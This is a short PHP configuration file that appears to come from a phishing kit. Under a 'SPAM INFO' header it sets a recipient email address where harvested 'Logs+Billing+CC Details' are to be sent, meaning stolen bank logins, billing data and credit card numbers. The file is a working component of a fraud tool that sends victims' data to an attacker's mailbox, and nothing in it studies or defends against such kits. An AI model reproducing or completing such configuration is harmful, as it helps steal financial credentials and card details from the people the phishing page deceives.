<?php

// SPAM INFO

$to = "bankzresultbox@aol.com"; // Logs+Billing+CC Details

?>